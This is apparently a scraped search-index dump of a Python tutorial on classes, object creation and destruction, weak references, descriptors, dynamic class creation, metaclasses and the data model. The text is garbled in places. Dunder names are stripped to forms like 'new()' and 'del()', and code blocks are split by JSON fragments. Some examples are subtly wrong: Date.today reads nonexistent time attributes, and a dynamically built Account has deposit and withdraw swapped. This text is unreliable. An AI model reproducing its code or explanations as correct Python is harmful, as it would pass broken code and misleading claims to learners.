<code>a = Account('Guido', 1000.0)</code> performs these steps:</p> <pre><code>a = Account.__new__(Account, 'Guido', 1000.0)\nif isinstance(a, Account):\n    Account.__init__(a, 'Guido', 1000.0)\n</code></pre> <p>Except for the first argument which is the class instead of an instance, <code>__new__()</code> normally receives the same arguments as <code>__init__()</code>. However, the default implementation of <code>__new__()</code> just ignores them. You\u2019ll sometimes see <code>__new__()</code> invoked with just a single argument. For example, this code also works:</p> <pre><code>a = Account.__new__(Account)\nif isinstance(a, Account):\n    Account.__init__(a, 'Guido', 1000.0)\n</code></pre> <p>Direct use of the <code>__new__()</code> method is uncommon, but sometimes it\u2019s used to create instances while bypassing the invocation of the <code>__init__()</code> method. One such use is in class methods. <pre><code>class Spam:\n    @classmethod\n    def bar(cls, *args, **kwargs):\n        return cls.__new__(cls, *args, **kwargs)\n</code></pre></p> <pre><code>import time\n\nclass Date:\n    def __init__(self, year, month, day):\n        self.year = year\n        self.month = month\n        self.day = day\n\n    @classmethod\n    def today(cls):\n        t = time.localtime()\n        self = cls.__new__(cls)   # Make instance\n        self.year = t.tm_year\n        self.month = t.tm_month\n        self.day = t.tm_day\n        return self\n</code></pre> <p>Modules that perform object serialization such as <code>pickle</code> also utilize <code>new()</code> to recreate instances when objects are deserialized. This is done without ever invoking <code>init()</code>.</p> <p>Sometimes a class will define <code>new()</code> if it wants to alter some aspect of instance creation. Typical applications include instance caching, singletons, and immutability. As an example, you might want <code>Date</code> class to perform date interning\u2014that is, caching and reusing <code>Date</code> instances that have an identical year, month, and day. Here is one way that might be implemented:</p> <pre><code>class Date:\n    _cache = { }\n\n    @staticmethod\n    def __new__(cls, year, month, day):\n        self = Date._cache.get((year,month,day))\n        if not self:\n            self = super().__new__(cls)\n            self.year = year\n            self.month = month\n            self.day = day\n            Date._cache[year,month,day] = self\n        return self\n\n    def __init__(self, year, month, day):\n        pass\n</code></pre> <p>In this example, the class keeps an internal dictionary of previously created <code>Date</code> instances. When creating a new <code>Date</code>, the cache is consulted first. If a match is found, that instance is returned. Otherwise, a new instance is created and initialized.</p> <p>A subtle detail of this solution is the empty <code>init()</code> method. Even though instances are cached, every call to <code>Date()</code> still invokes <code>init()</code>. To avoid duplicated effort, the method simply does nothing\u2014instance creation actually takes place in <code>new()</code> when an instance is created the first time.</p> <p>There are ways to avoid the extra call to <code>init()</code> but it requires sneaky tricks. One way to avoid it is to have <code>new()</code> return an entirely different type instance\u2014for example, one belonging to a different class. Another solution, described later, is to use a metaclass.</p> <p>Once created, instances are managed by reference counting. If the reference count reaches zero, the instance is immediately destroyed. When the instance is about to be destroyed, the interpreter first looks for a <code>del()</code> method associated with the object and calls it. For example:</p> <pre><code>class Account(object):\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n\n    def __del__(self):\n        print('Deleting Account')\n</code></pre> <p>Occasionally, a program will use the <code>del</code> statement to delete a reference to an object as shown. If this causes the reference count of the object to reach zero, the <code>del()</code> method is called. However, in general, the <code>del</code> statement doesn\u2019t directly call <code>del()</code> because there may be other object references living elsewhere. There are many other ways that an object might be deleted\u2014for example, reassignment of a variable name or a variable going out of scope in a function:</p> <pre><code>&gt;&gt;&gt; a = Account('Guido', 1000.0)\n&gt;&gt;&gt; a = 42\nDeleting Account\n&gt;&gt;&gt; def func():\n...     a = Account('Guido', 1000.0)\n...\n&gt;&gt;&gt; func()\nDeleting Account\n</code></pre> <p>In practice, it\u2019s rarely necessary for a class to define a <code>del()</code> method. The only exception is when the destruction of an object requires an extra cleanup action\u2014such as closing a file, shutting down a network connection, or releasing other system resources. Even in these cases, it\u2019s dangerous to rely on <code>del()</code> for a proper shutdown because there\u2019s no guarantee that this method will be called when you think it would. For clean shutdown of resources, you should give the object an explicit <code>close()</code> method. You should also make your class support the context manager protocol so it can be used with the <code>with</code> statement. Here is an example that covers all of the cases:</p> <pre><code>class SomeClass:\n    def __init__(self):\n        self.resource = open_resource()\n\n    def __del__(self):\n        self.close()\n\n    def close(self):\n        self.resource.close()\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, ty, val, tb):\n        self.close()\n\n# Closed via __del__()\ns = SomeClass()\ndel s\n\n# Explicit close\ns = SomeClass()\ns.close()\n\n# Closed at the end of a context block\nwith SomeClass() as s:\n    ...\n</code></pre> <p>Again, it should be emphasized that writing a <code>del()</code> in a class is almost never necessary. Python already has garbage collection and there is simply no need to do it unless there is some extra action that needs to take place upon object destruction. Even then, you still might not need <code>del()</code> as it\u2019s possible that the object is already programmed to clean itself up properly even if you do nothing.</p> <p>As if there weren\u2019t enough dangers with reference counting and object destruction, there are certain kinds of programming patterns\u2014especially those involving parent-child relationships, graphs, or caching\u2014where objects can create a so-called reference cycle. <pre><code>class SomeClass:\n    def __del__(self):\n        print('Deleting')\n\nparent = SomeClass()\nchild = SomeClass()\n</code></pre></p>"},{"location":"python/classes/classes/#create-a-child-parent-reference-cycle","title":"Create a child-parent reference cycle","text":"<p>parent.child = child child.parent = parent</p>"},{"location":"python/classes/classes/#try-deletion-no-output-from-del-appears","title":"Try deletion (no output from del appears)","text":"<p>del parent del child</p> <p>In this example, the variable names are destroyed but you never see execution of the <code>del()</code> method. The two objects each hold internal references to each other, so there\u2019s no way for the reference count to ever drop to 0. To handle this, a special cycle-detecting garbage collector runs every so often. Eventually the objects will be reclaimed, but it\u2019s hard to predict when this might happen. If you want to force garbage collection, you can call <code>gc.collect()</code>. The <code>gc</code> module has a variety of other functions related to the cyclic garbage collector and monitoring memory.</p> <p>Because of the unpredictable timing of garbage collection, the <code>del()</code> method has a few restrictions placed on it. First, any exception that propagates out of <code>del()</code> is printed to <code>sys.stderr</code>, but otherwise ignored. Second, the <code>del()</code> method should avoid operations such as acquiring locks or other resources. Doing so could result in a deadlock when <code>del()</code> is unexpectedly fired in the middle of executing an unrelated function within the seventh inner callback circle of signal handling and threads. If you must define <code>del()</code>, keep it simple.</p> <p>weak references</p> <p>Sometimes objects are kept alive when you\u2019d much rather see them die. In an earlier example, a <code>Date</code> class was shown with internal caching of instances. One problem with this implementation is that there is no way for an instance to ever be removed from the cache. As such, the cache will grow larger and larger over time.</p> <p>One way to fix this problem is to create a weak reference using the <code>weakref</code> module. A weak reference is a way of creating a reference to an object without increasing its reference count. To work with a weak reference, you have to add an extra bit of code to check if the object being referred to still exists. Here\u2019s an example of how you create a weakref:</p> <pre><code>import weakref\na_ref = weakref.ref(a)\n</code></pre> <p>In this example, <code>a_ref</code> is a weak reference to the object <code>a</code>. You can use the weak reference to access the object, but it doesn't prevent the object from being garbage collected.</p> <pre><code>a = Account('Guido', 1000.0)\nimport weakref\na_ref = weakref.ref(a)\na_ref()\n</code></pre> <p>Support for weak references requires instances to have a mutable <code>weakref</code> attribute. Instances of user-defined classes normally have such an attribute by default. However, built-in types and certain kinds of special data structures\u2014named tuples, classes with slots\u2014do not. If you want to construct weak references to these types, you can do it by defining variants with a <code>weakref</code> attribute added:</p> <pre><code>class wdict(dict):\n    __slots__ = ('__weakref__',)\n\nw = wdict()\nw_ref = weakref.ref(w)      # Now works\n</code></pre> <p>attribute binding</p> <p>The state associated with an instance is stored in a dictionary that\u2019s accessible as the instance\u2019s <code>__dict__</code> attribute. This dictionary contains the data that\u2019s unique to each instance.</p> <p>Classes are linked to their base classes by a special attribute <code>__bases__</code>, which is a tuple of the base classes. The <code>__bases__</code> attribute is only informational. The actual runtime implementation of inheritance uses the <code>__mro__</code> attribute which is a tuple of all parent classes listed in search order. This underlying structure is the basis for all operations that get, set, or delete the attributes of instances.</p> <p>Whenever an attribute is set using <code>obj.name = value</code>, the special method <code>obj.__setattr__('name', value)</code> is invoked. If an attribute is deleted using <code>del obj.name</code>, the special method <code>obj.__delattr__('name')</code> is invoked. The default behavior of these methods is to modify or remove values from the local <code>__dict__</code> of <code>obj</code> unless the requested attribute happens to correspond to a property or descriptor. In that case, the set and delete operations will be carried out by the <code>__set__</code> and <code>__delete__</code> functions associated with the property.</p> <p>For attribute lookup such as <code>obj.name</code>, the special method <code>obj.__getattribute__('name')</code> is invoked. This method carries out the search for the attribute, which normally includes checking the properties, looking in the local <code>__dict__</code>, checking the class dictionary, and searching the MRO. If this search fails, a final attempt to find the attribute is made by invoking the <code>obj.__getattr__('name')</code> method of the class (if defined). If this fails, an <code>AttributeError</code> exception is raised.</p> <p>User-defined classes can implement their own versions of the attribute access functions, if desired. For example, here\u2019s a class that restricts the attribute names that can be set:</p> <pre><code>class Account:\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n\n    def __setattr__(self, name, value):\n        if name not in {'owner', 'balance'}:\n            raise AttributeError(f'No attribute {name}')\n        super().__setattr__(name, value)\n</code></pre>"},{"location":"python/classes/classes/#example","title":"Example","text":"<p>a = Account('Guido', 1000.0) a.balance = 940.25          # Ok a.amount = 540.2            # AttributeError. No attribute amount</p> <p>proxies, wrappers, delegations</p> <p>A common implementation technique for proxies involves the <code>getattr()</code> method. Here is a simple example:</p> <pre><code>class A:\n    def spam(self):\n        print('A.spam')\n\n    def grok(self):\n        print('A.grok')\n\n    def yow(self):\n        print('A.yow')\n\nclass LoggedA:\n    def __init__(self):\n        self._a = A()\n\n    def __getattr__(self, name):\n        print('Accessing', name)\n        # Delegate to internal A instance\n        return getattr(self._a, name)\n</code></pre> <p>In this example, the <code>LoggedA</code> class acts as a proxy for class <code>A</code>. When an attribute is accessed on an instance of <code>LoggedA</code>, the <code>__getattr__()</code> method is invoked. It prints the accessed attribute name and then delegates the attribute access to the internal instance of <code>A</code>.</p> <p>Example use:</p> <pre><code>a = LoggedA()\na.spam()       # prints 'Accessing spam' and 'A.spam'\na.yow()        # prints 'Accessing yow' and 'A.yow'\n</code></pre> <p>Delegation is sometimes used as an alternative to inheritance. Here is an example:</p> <pre><code>class A:\n    def spam(self):\n        print('A.spam')\n\n    def grok(self):\n        print('A.grok')\n\n    def yow(self):\n        print('A.yow')\n\nclass B:\n    def __init__(self):\n        self._a = A()\n\n    def grok(self):\n        print('B.grok')\n\n    def __getattr__(self, name):\n        return getattr(self._a, name)\n</code></pre> <p>In this example, class <code>B</code> holds an internal reference to an instance of <code>A</code> and delegates attribute access to it. Methods defined in class <code>B</code> override the corresponding methods in class <code>A</code>, while all other methods are delegated to the internal instance of <code>A</code>.</p> <p>Example use:</p> <pre><code>b = B()\nb.spam()      # -&gt; A.spam\nb.grok()      # -&gt; B.grok   (redefined method)\nb.yow()       # -&gt; A.yow\n</code></pre> <p>The technique of forwarding attribute lookup via <code>__getattr__()</code> is a common technique. However, be aware that it does not apply to operations mapped to special methods. For example, consider this class:</p> <pre><code>class ListLike:\n    def __init__(self):\n        self._items = list()\n\n    def __getattr__(self, name):\n        return getattr(self._items, name)\n</code></pre> <p>In this example, the <code>ListLike</code> class forwards all of the standard list methods to an inner list using <code>__getattr__()</code>. However, operations such as <code>len(a)</code> or <code>a[0]</code> fail because they are not mapped to special methods (<code>__len__()</code> and <code>__getitem__()</code>). To make those work, you would have to explicitly implement the required special methods.</p> <p>To illustrate, here's an updated <code>ListLike</code> class that implements the necessary special methods:</p> <pre><code>class ListLike:\n    def __init__(self):\n        self._items = list()\n\n    def __getattr__(self, name):\n        return getattr(self._items, name)\n\n    def __len__(self):\n        return len(self._items)\n\n    def __getitem__(self, index):\n        return self._items[index]\n\n    def __setitem__(self, index, value):\n        self._items[index] = value\n</code></pre>"},{"location":"python/classes/classes/#slots","title":"slots","text":"<p>The <code>slots</code> attribute is a definition hint that allows Python to make performance optimizations for both memory use and execution speed. It eliminates the need for a dictionary to store instance data and uses a more compact array-based data structure instead. Using <code>slots</code> can result in a substantial reduction in memory use and a modest improvement in execution time, especially in programs that create a large number of objects.</p> <p>Here are some key points about <code>slots</code>:</p> <ul> <li>The <code>slots</code> attribute lists only the instance attributes and does not include methods, properties, class variables, or any other class-level attributes.</li> <li>If a class uses <code>slots</code>, any derived class must also define <code>slots</code> (even if empty) to take advantage of the benefits. Failure to do so will result in slower performance and increased memory usage.</li> <li><code>slots</code> is not compatible with multiple inheritance. If multiple base classes with non-empty <code>slots</code> are specified, a <code>TypeError</code> will be raised.</li> <li>Code that relies on the underlying <code>__dict__</code> attribute of instances may break when <code>slots</code> is used.</li> <li><code>slots</code> has no effect on the invocation of methods such as <code>__getattribute__()</code>, <code>__getattr__()</code>, and <code>__setattr__()</code> if they are redefined in a class. However, the absence of the instance <code>__dict__</code> attribute should be considered when implementing these methods.</li> </ul>"},{"location":"python/classes/classes/#descriptors","title":"Descriptors","text":"<p>Descriptors provide a way to customize attribute access in Python by implementing the special methods <code>__get__()</code>, <code>__set__()</code>, and <code>__delete__()</code>. They are class-level objects that manage access to attributes. Properties are implemented using descriptors.</p> <p>Here's an example of a descriptor class called <code>Typed</code>:</p> <pre><code>class Typed:\n    expected_type = object\n\n    def __set_name__(self, cls, name):\n        self.key = name\n\n    def __get__(self, instance, cls):\n        if instance:\n            return instance.__dict__[self.key]\n        else:\n            return self\n\n    def __set__(self, instance, value):\n        if not isinstance(value, self.expected_type):\n            raise TypeError(f'Expected {self.expected_type}')\n        instance.__dict__[self.key] = value\n\n    def __delete__(self, instance):\n        raise AttributeError(\"Can't delete attribute\")\n</code></pre> <p>In this example, the <code>Typed</code> class defines a descriptor that performs type checking when an attribute is assigned and raises an error if an attempt is made to delete the attribute. Subclasses like <code>Integer</code>, <code>Float</code>, and <code>String</code> specialize <code>Typed</code> to match specific types.</p> <p>Descriptors are used by including them as class attributes in another class. For example:</p> <pre><code>class Account:\n    owner = String()\n    balance = Float()\n\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n</code></pre> <p>In this case, the <code>Account</code> class uses the descriptors <code>String</code> and <code>Float</code> to automatically call the appropriate <code>__get__()</code>, <code>__set__()</code>, or <code>__delete__()</code> methods when accessing the <code>owner</code> and <code>balance</code> attributes.</p> <p>Descriptors take precedence over items in the instance dictionary. Even if an instance dictionary has a matching entry, the descriptor's <code>__set__()</code> method will be invoked. For example:</p> <pre><code>a = Account('Guido', 1000.0)\na.balance = 'a lot'  # Raises TypeError: Expected &lt;class 'float'&gt;\n</code></pre> <p>The <code>__get__(instance, cls)</code> method of a descriptor takes arguments for both the instance and the class. When invoked at the class level, the instance argument is <code>None</code>. The <code>__get__()</code> method typically returns the descriptor itself if no instance is provided.</p> <pre><code>Account.balance  # Returns &lt;__main__.Float object at 0x110606710&gt;\n</code></pre>"},{"location":"python/classes/classes/#method-descriptor","title":"Method Descriptor","text":"<p>A descriptor that only implements <code>__get__()</code> is known as a method descriptor. It is mainly used to implement Python's various types of methods, such as instance methods, class methods, and static methods. The <code>__get__()</code> method of a method descriptor only gets invoked if there is no matching entry in the instance dictionary.</p> <p>Here's an example of implementing <code>@classmethod</code> and <code>@staticmethod</code> using method descriptors:</p> <pre><code>import types\n\nclass classmethod:\n    def __init__(self, func):\n        self.__func__ = func\n\n    def __get__(self, instance, cls):\n        return types.MethodType(self.__func__, cls)\n\nclass staticmethod:\n    def __init__(self, func):\n        self.__func__ = func\n\n    def __get__(self, instance, cls):\n        return self.__func__\n</code></pre> <p>Lazy Evaluation</p> <p>Method descriptors can be used to implement lazy evaluation of attributes. By only computing and assigning the attribute value when it is accessed for the first time, we can save computational resources.</p> <p>Here's an example of implementing lazy evaluation using a descriptor called <code>Lazy</code>:</p> <pre><code>class Lazy:\n    def __init__(self, func):\n        self.func = func\n\n    def __set_name__(self, cls, name):\n        self.key = name\n\n    def __get__(self, instance, cls):\n        if instance:\n            value = self.func(instance)\n            instance.__dict__[self.key] = value\n            return value\n        else:\n            return self\n</code></pre> <p>In this example, the <code>Lazy</code> descriptor is used in the <code>Rectangle</code> class to lazily compute the area and perimeter attributes:</p> <pre><code>class Rectangle:\n    def __init__(self, width, height):\n        self.width = width\n        self.height = height\n\n    area = Lazy(lambda self: self.width * self.height)\n    perimeter = Lazy(lambda self: 2*self.width + 2*self.height)\n</code></pre> <p>When the <code>area</code> or <code>perimeter</code> attributes are accessed for the first time, the corresponding lambda function is executed to compute the value. The computed value is then stored in the instance's <code>__dict__</code> attribute for future use.</p>"},{"location":"python/classes/classes/#class-definitions","title":"Class Definitions","text":"<p>The definition of a class is a dynamic process. When you define a class using the class statement, a new dictionary is created that serves as the local class namespace. The body of the class then executes as a script within this namespace. Eventually, the namespace becomes the <code>__dict__</code> attribute of the resulting class object.</p> <p>Any legal Python statement is allowed in the body of a class. Normally, you just define functions and variables, but control flow, imports, nested classes, and everything else is allowed. For example, here is a class that conditionally defines methods:</p> <pre><code>class Account:\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n\n    if debug:\n        import logging\n        log = logging.getLogger(f'{__module__}.{__qualname__}')\n        def deposit(self, amount):\n            Account.log.debug('Depositing %f', amount)\n            self.balance += amount\n\n        def withdraw(self, amount):\n            Account.log.debug('Withdrawing %f', amount)\n            self.balance -= amount\n    else:\n        def deposit(self, amount):\n            self.balance += amount\n\n        def withdraw(self, amount):\n            self.balance -= amount\n</code></pre> <p>In this example, a global variable <code>debug</code> is being used to conditionally define methods. The <code>__module__</code> and <code>__qualname__</code> variables are predefined strings that hold information about the class name and enclosing module. These can be used by statements in the class body. In this example, they're being used to configure the logging system. There are probably cleaner ways of organizing the above code, but the key point is that you can put anything you want in a class.</p> <p>One critical point about class definition is that the namespace used to hold the contents of the class body is not a scope of variables. Any name that gets used within a method (such as <code>Account.log</code> in the above example) needs to be fully qualified.</p> <p>If a function like <code>locals()</code> is used in a class body (but not inside a method), it returns the dictionary being used for the class namespace.</p>"},{"location":"python/classes/classes/#dynamic-class-creation","title":"Dynamic Class Creation","text":"<p>Normally, classes are created using the <code>class</code> statement, but this is not a requirement. As noted in the previous section, classes are defined by executing the body of a class to populate a namespace. If you're able to populate a dictionary with your own definitions, you can make a class without ever using the <code>class</code> statement. To do that, use <code>types.new_class()</code>:</p> <pre><code>import types\n\n# Some methods (not in a class)\ndef __init__(self, owner, balance):\n    self.owner = owner\n    self.balance = balance\n\ndef deposit(self, amount):\n    self.balance -= amount\n\ndef withdraw(self, amount):\n    self.balance += amount\n\nmethods = {\n   '__init__': __init__,\n   'deposit': deposit,\n   'withdraw': withdraw,\n}\n\nAccount = types.new_class('Account', (),\n               exec_body=lambda ns: ns.update(methods))\n\n# You now have a class\na = Account('Guido', 1000.0)\na.deposit(50)\na.withdraw(25)\n</code></pre> <p>Dynamic class creation may be useful if you want to create classes from data structures or generate classes programmatically. For example, in the section on descriptors, the following classes were defined:</p> <pre><code>class Integer(Typed):\n    expected_type = int\n\nclass Float(Typed):\n    expected_type = float\n\nclass String(Typed):\n    expected_type = str\n</code></pre> <p>This code is highly repetitive. A data-driven approach can be used to generate the classes dynamically:</p> <pre><code>typed_classes = [\n   ('Integer', int),\n   ('Float', float),\n   ('String', str),\n   ('Bool', bool),\n   ('Tuple', tuple),\n]\n\nglobals().update(\n   (name, types.new_class(name, (Typed,),\n          exec_body=lambda ns: ns.update(expected_type=ty)))\n   for name, ty in typed_classes)\n</code></pre> <p>In this example, the global module namespace is being updated with dynamically created classes using <code>types.new_class()</code>. The <code>typed_classes</code> list defines the names and expected types for each class. Each class is created by calling <code>types.new_class()</code> with the class name, base classes, and an <code>exec_body</code> function that updates the namespace with the expected type. The resulting classes are then added to the global namespace using <code>globals().update()</code>.</p> <p>Sometimes you will see <code>type()</code> being used to dynamically create a class instead. For example:</p> <pre><code>Account = type('Account', (), methods)\n</code></pre> <p>This works, but it doesn\u2019t take into account some of the more advanced class machinery such as metaclasses. In modern code, try to use <code>types.new_class()</code> instead.</p>"},{"location":"python/classes/classes/#metaclasses","title":"Metaclasses","text":"<p>When you define a class in Python, the class definition itself becomes an object. Here's an example:</p> <pre><code>class Account:\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n\n    def deposit(self, amount):\n        self.balance += amount\n\n    def withdraw(self, amount):\n        self.balance -= amount\n</code></pre> <p>To check if <code>Account</code> is an object, you can use the <code>isinstance</code> function:</p> <pre><code>isinstance(Account, object)\n</code></pre> <p>If you think about this long enough, you will realize that if <code>Account</code> is an object, then something had to create it. This creation of the class object is controlled by a special kind of class called a metaclass. Simply put, a metaclass is a class that creates instances of classes.</p> <p>In the preceding example, the metaclass that created <code>Account</code> is a built-in class called <code>type</code>. In fact, if you check the type of <code>Account</code>, you will see that it is an instance of <code>type</code>:</p> <pre><code>type(Account)\n</code></pre> <p>It's a bit brain-bending, but it's similar to integers. For example, if you write <code>x = 42</code> and then look at <code>x.__class__</code>, you'll get <code>int</code>, which is the class that creates integers. Similarly, <code>type</code> makes instances of types or classes.</p> <p>When a new class is defined with the <code>class</code> statement, a number of things happen. First, a new namespace for the class is created. Next, the body of the class is executed in this namespace. Finally, the class name, base classes, and populated namespace are used to create the class instance. The following code illustrates the low-level steps that take place:</p> <pre><code>namespace = type.__prepare__('Account', ())\n\n# Step 2: Execute the class body\nexec('''\ndef __init__(self, owner, balance):\n    self.owner = owner\n    self.balance = balance\n\ndef deposit(self, amount):\n    self.balance += amount\n\ndef withdraw(self, amount):\n    self.balance -= amount\n''', globals(), namespace)\n\n# Step 3: Create the final class object\nAccount = type('Account', (), namespace)\n</code></pre> <p>In the definition process, there is interaction with the <code>type</code> class to create the class namespace and to create the final class object. The choice of using <code>type</code> can be customized - a class can choose to be processed by a different metaclass by specifying a different metaclass. This is done by using the <code>metaclass</code> keyword argument in inheritance:</p> <pre><code>class Account(metaclass=type):\n</code></pre> <p>If no metaclass is given, the <code>class</code> statement examines the type of the first entry in the tuple of base classes (if any) and uses that as the metaclass. Therefore, if you write <code>class Account(object)</code>, the resulting <code>Account</code> class will have the same type as <code>object</code> (which is <code>type</code>). Note that classes that don't specify any parent at all always inherit from <code>object</code>, so this still applies.</p> <p>To create a new metaclass, define a class that inherits from <code>type</code>. Within this class, you can redefine one or more methods that are used during the class creation process. Typically, this includes the <code>__prepare__()</code> method used to create the class namespace, the <code>__new__()</code> method used to create the class instance, the <code>__init__()</code> method called after a class has already been created, and the <code>__call__()</code> method used to create new instances. The following example implements a metaclass that merely prints the input arguments to each method so you can experiment:</p> <pre><code>class mytype(type):\n    # Creates the class namespace\n    @classmethod\n    def __prepare__(meta, clsname, bases):\n        print('Preparing:', clsname, bases)\n        return super().__prepare__(clsname, bases)\n\n    # Creates the class instance after body has executed\n    @staticmethod\n    def __new__(meta, clsname, bases, namespace):\n        print('Creating:', clsname, bases, namespace)\n        return super().__new__(meta, clsname, bases, namespace)\n\n    # Initializes the class instance\n    def __init__(cls, clsname, bases, namespace):\n        print('Initializing:', clsname, bases, namespace)\n        super().__init__(clsname, bases, namespace)\n\n    # Creates new instances of the class\n    def __call__(cls, *args, **kwargs):\n        print('Creating instance:', args, kwargs)\n        return super().__call__(*args, **kwargs)\n</code></pre>"},{"location":"python/classes/classes/#example_1","title":"Example","text":"<pre><code>class Base(metaclass=mytype):\n    pass\n</code></pre> <p>The definition of the <code>Base</code> produces the following output:</p> <pre><code># Preparing: Base ()\n# Creating: Base () {'__module__': '__main__', '__qualname__': 'Base'}\n# Initializing: Base () {'__module__': '__main__', '__qualname__': 'Base'}\n</code></pre> <pre><code>b = Base()\n</code></pre> <p>Creating instance: <code>()</code>.</p> <p>One tricky facet of working with metaclasses is the naming of variables and keeping track of the various entities involved. In the above code, the <code>meta</code> name refers to the metaclass itself. The <code>cls</code> name refers to a class instance created by the metaclass. Although not used here, the <code>self</code> name refers to a normal instance created by a class.</p> <p>Metaclasses propagate via inheritance. So, if you've defined a base class to use a different metaclass, all child classes will also use that metaclass. Try this example to see your custom metaclass at work:</p> <pre><code>class Account(Base):\n    def __init__(self, owner, balance):\n        self.owner = owner\n        self.balance = balance\n\n    def deposit(self, amount):\n        self.balance += amount\n\n    def withdraw(self, amount):\n        self.balance -= amount\n\nprint(type(Account))   # -&gt; &lt;class 'mytype'&gt;\n</code></pre> <p>The primary use of metaclasses is in situations where you want to exert extreme low-level control over the class definition environment and creation process. Before proceeding, however, remember that Python already provides a lot of functionality for monitoring and altering class definitions (such as the <code>__init_subclass__()</code> method, class decorators, descriptors, mixins, and so on). Most of the time, you probably don't need a metaclass. That said, the next few examples show situations where a metaclass provides the only sensible solution.</p> <p>One use of a metaclass is in rewriting the contents of the class namespace prior to the creation of the class object. Certain features of classes are established at definition time and can't be modified later. One such feature is <code>__slots__</code>. As noted earlier, <code>__slots__</code> is a performance optimization related to the memory layout of instances. Here's a metaclass that automatically sets the <code>__slots__</code> attribute based on the calling signature of the <code>__init__()</code> method.</p> <pre><code>import inspect\n\nclass SlotMeta(type):\n    @staticmethod\n    def __new__(meta, clsname, bases, methods):\n        if '__init__' in methods:\n            sig = inspect.signature(methods['__init__'])\n            __slots__ = tuple(sig.parameters)[1:]\n        else:\n            __slots__ = ()\n        methods['__slots__'] = __slots__\n        return super().__new__(meta, clsname, bases, methods)\n\nclass Base(metaclass=SlotMeta):\n    pass\n</code></pre>"},{"location":"python/classes/classes/#example_2","title":"Example","text":"<pre><code>class Point(Base):\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n</code></pre> <p>In this example, the <code>Point</code> class that's created is automatically created with slots of <code>('x', 'y')</code>. The resulting instances of <code>Point</code> now get memory savings without knowing that slots are being used. It doesn't have to be specified directly. This kind of trick is not possible with class decorators or with <code>init_subclass()</code> because those features only operate on a class after it's been created. By then, it's too late to apply the slots optimization.</p> <p>Another use of metaclasses is for altering the class definition environment. For example, duplicate definitions of a name during class definition normally result in a silent error - the second definition overwrites the first. Suppose you wanted to catch that. Here's a metaclass that does that by defining a different kind of dictionary for the class namespace:</p> <pre><code>class NoDupeDict(dict):\n    def __setitem__(self, key, value):\n        if key in self:\n            raise AttributeError(f'{key} already defined')\n        super().__setitem__(key, value)\n\nclass NoDupeMeta(type):\n    @classmethod\n    def __prepare__(meta, clsname, bases):\n        return NoDupeDict()\n\nclass Base(metaclass=NoDupeMeta):\n    pass\n</code></pre>"},{"location":"python/classes/classes/#example_3","title":"Example","text":"<pre><code>class SomeClass(Base):\n    def yow(self):\n        print('Yow!')\n\n    def yow(self, x):             # Fails. Already defined\n        print('Different Yow!')\n</code></pre> <p>This is only a small sample of what's possible. For framework builders, metaclasses offer an opportunity to tightly control what happens during class definition - allowing classes to serve as a kind of domain-specific language.</p> <p>Historically, metaclasses have been used to accomplish a variety of tasks that are now possible through other means. The <code>init_subclass()</code> method, in particular, can be used to address a wide variety of use cases where metaclasses were once applied. This includes registration of classes with a central registry, automatic decoration of methods, and code generation.</p>"},{"location":"python/classes/classes/#built-in-objects-for-instances-and-classes","title":"Built-in Objects for Instances and Classes","text":"Attribute Description <code>cls.__name__</code> Class name <code>cls.__module__</code> Module name in which the class is defined <code>cls.__qualname__</code> Fully qualified class name <code>cls.__bases__</code> Tuple of base classes <code>cls.__mro__</code> Method Resolution Order tuple <code>cls.__dict__</code> Dictionary holding class methods and variables <code>cls.__doc__</code> Documentation string <code>cls.__annotations__</code> Dictionary of class type hints <code>cls.__abstractmethods__</code> Set of abstract method names (may be undefined if there aren't any) Attribute Description <code>i.__class__</code> Class to which the instance belongs <code>i.__dict__</code> Dictionary holding instance data (if defined)"},{"location":"python/classes/data_model/","title":"Python Data Model","text":"<p>When using a framework, we spend a lot of time coding methods that are called by the framework. The same happens when we leverage the Python Data Model. The Python interpreter invokes special methods to perform basic object operations, often triggered by special syntax. The special method names are always written with leading and trailing double underscores (i.e., <code>__getitem__</code>). For example, the syntax <code>obj[key]</code> is supported by the <code>__getitem__</code> special method. In order to evaluate <code>my_collection[key]</code>, the interpreter calls <code>my_collection.getitem(key)</code>.</p> <p>The special method names allow your objects to implement, support, and interact with fundamental language constructs such as:</p> <ul> <li>Collections</li> <li>Attribute access</li> <li>Iteration (including asynchronous iteration using <code>async for</code>)</li> <li>Operator overloading</li> <li>Function and method invocation</li> <li>String representation and formatting</li> <li>Asynchronous programming using <code>await</code></li> <li>Object creation and destruction</li> <li>Managed contexts (including asynchronous context managers using <code>async with</code>)</li> </ul>"},{"location":"python/classes/data_model/#example","title":"Example","text":"<pre><code>import collections\nCard = collections.namedtuple('Card', ['rank', 'suit'])\n\nclass FrenchDeck:\n    ranks = [str(n) for n in range(2, 11)] + list('JQKA')\n    suits = 'spades diamonds clubs hearts'.split()\n\n    def __init__(self):\n        self._cards = [Card(rank, suit) for suit in self.suits for rank in self.ranks]\n\n    def __len__(self):\n        return len(self._cards)\n\n    def __getitem__(self, position):\n        return self._cards[position]\n</code></pre> Special Methods Description <code>__iter__</code> Iterable <code>__len__</code> Sized <code>__contains__</code> Container Strings/bytes <code>__repr__</code> String representation <code>__str__</code> String representation <code>__format__</code> Formatting <code>__bytes__</code> Bytes representation <code>__fspath__</code> File path representation Number <code>__abs__</code> Absolute value <code>__bool__</code> Boolean value <code>__complex__</code> Complex number <code>__int__</code> Integer representation <code>__float__</code> Float representation <code>__hash__</code> Hash value <code>__index__</code> Indexing Collections <code>__len__</code> Length <code>__getitem__</code> Item access <code>__setitem__</code> Item assignment <code>__delitem__</code> Item deletion <code>__contains__</code> Membership test Iteration <code>__iter__</code> Iteration <code>__aiter__</code> Asynchronous iteration <code>__next__</code> Next item <code>__anext__</code> Asynchronous next item <code>__reversed__</code> Reversed iteration Callable or coroutine <code>__call__</code> Function or method invocation <code>__await__</code> Asynchronous await Context managers <code>__enter__</code> Context manager enter <code>__aenter__</code> Asynchronous context manager enter <code>__exit__</code> Context manager exit <code>__aexit__</code> Asynchronous context manager exit Instance creation and destruction <code>__new__</code> Object creation <code>__init__</code> Object initialization <code>__del__</code> Object destruction Attribute management <code>__getattr__</code> Attribute retrieval <code>__getattribute__</code> Attribute access <code>__setattr__</code> Attribute assignment <code>__delattr__</code> Attribute deletion <code>__dir__</code> Directory 